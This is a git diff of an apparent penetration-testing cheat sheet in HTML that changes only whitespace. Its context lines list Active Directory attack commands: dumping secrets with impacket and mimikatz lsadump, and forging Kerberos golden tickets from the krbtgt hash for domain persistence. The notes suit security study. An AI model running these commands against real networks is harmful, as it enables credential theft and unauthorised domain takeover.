@@ -1917,7 +1917,7 @@ layout: default
         <ul>
             <li>impacket-SecretsDump</li>
         </ul>
-
+        
         <li>Get domain SID</li>
         <ul>
             <li>On Windows</li>
@@ -1925,7 +1925,7 @@ layout: default
                 <li>PS &gt; Get-ADDomain &lt;Domain&gt;</li>
             </ul>
         </ul>
-
+        
         <li>impacket-ticketer</li>
         <ul>
             <li>impacket-ticketer -nthash &lt;krbtgt ntlm hash&gt; -domain-sid &lt;domain sid&gt; -domain &lt;Domain Name&gt; &lt;Username&gt;</li>
@@ -1937,7 +1937,7 @@ layout: default
             <ul>
                 <li>Try DNS names instead of ip address in command</li>
             </ul>
-
+            
             <li>psexec will always login as SYSTEM</li>
             <ul>
                 <li>switch to wmiexec to login as Administrator instead of SYSTEM</li>
@@ -1952,17 +1952,17 @@ layout: default
             <li>mimikatz: privilege::debug</li>
             <li>mimikatz: lsadump::lsa /patch</li>
         </ul>
-
+        
         <li>Purge kerberos tickets</li>
         <ul>
             <li>mimikatz: kerberos::purge</li>
         </ul>
-
+        
         <li>Create golden ticket</li>
         <ul>
             <li>mimikatz: kerberos::golden /user:fakeuser /domain:corp.com /sid:s-1-5-&lt;sid&gt; /krbtgt:&lt;krbtgt hash /ptt&gt;</li>
         </ul>
-
+        
         <li>Launch new command prompt</li>
         <ul>
             <li>misc::cmd</li>
